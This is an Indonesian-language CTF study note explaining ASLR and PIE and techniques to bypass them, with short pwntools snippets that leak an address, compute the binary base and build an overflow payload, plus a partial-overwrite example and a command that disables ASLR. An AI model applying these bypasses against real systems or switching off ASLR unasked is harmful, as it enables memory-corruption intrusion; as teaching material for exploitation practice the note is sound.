#cybersecurity

ASLR (Address Space Layout Randomization) dan PIE (Position Independent Executable) membuat **alamat berubah setiap kali program dijalankan**, sehingga payload yang berisi alamat statis tidak bisa dipakai langsung.

## ASLR

ASLR merandomisasi alamat **libc, stack, heap, dan mmap** di level OS.

```bash
cat /proc/sys/kernel/randomize_va_space
# 2 = aktif (default)
```

Cek praktis - jalankan dua kali, alamat berubah:

```bash
$ ./chall
alamat puts: 0x7f1234567890
$ ./chall
alamat puts: 0x7f9999abcdef
```

## PIE

PIE merandomisasi **base address binary itu sendiri**. Tanpa PIE, alamat fungsi di binary tetap (`0x401236`); dengan PIE, base binary acak, jadi alamat fungsi = `base + offset`.

```bash
checksec --file=chall
# PIE: PIE enabled
```

## Offset tetap!

Yang penting: walaupun alamat berubah, **offset (jarak antar alamat) tetap**. Misalnya:

```
puts  = base + 0x1000
main  = base + 0x1500
```

Kalau kita tahu satu alamat, kita bisa hitung yang lain.

## Bypass

### 1. Leak alamat

Program sering membocorkan alamat (print pointer, format string, puts). Dari leak, hitung base:

```python
from pwn import *

elf = context.binary = ELF("./chall")

# leak satu alamat dari program (contoh: puts)
leak = u64(io.recv(6).ljust(8, b"\x00"))

# PIE: base = leak - offset fungsi itu di binary
elf.address = leak - elf.sym.puts

# sekarang semua symbol sudah benar
payload = b"A"*offset + p64(elf.sym.win)
```

### 2. Partial overwrite

Kalau hanya byte terakhir alamat yang perlu diubah (alamat base sama, misal beda 1 halaman), timpa sebagian:

```python
# payload menimpa 2 byte terakhir return address saja
payload = b"A"*offset + b"\x36\x12"
```

Ini sering dipakai untuk menimpa byte bawah tanpa null byte.

### 3. Ret2csu / ret2plt

Memanggil fungsi lewat PLT tidak butuh alamat libc (lihat [[8. GOT dan PLT]]).

### 4. ASLR off di lab

Untuk latihan, bisa dimatikan sementara:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Tapi di CTF remote ASLR selalu aktif - harus belajar leak.

## Ringkasan

| Proteksi | Yang acak | Bypass |
|---|---|---|
| ASLR | libc, stack, heap | leak alamat → hitung offset |
| PIE | base binary | leak → `elf.address = leak - offset` |
| Keduanya | semuanya | leak dua-duanya |

## Catatan

- Leak adalah skill inti PWN: cari tahu bagaimana program "tidak sengaja" menampilkan alamat.
- `printf("%p")`, pointer di error message, `puts` pada input yang mengandung `%p`, semuanya bisa jadi leak.
- Alamat yang di-leak harus di-unpack dengan `u64` (lihat [[Little Endian dan Format Data]]).
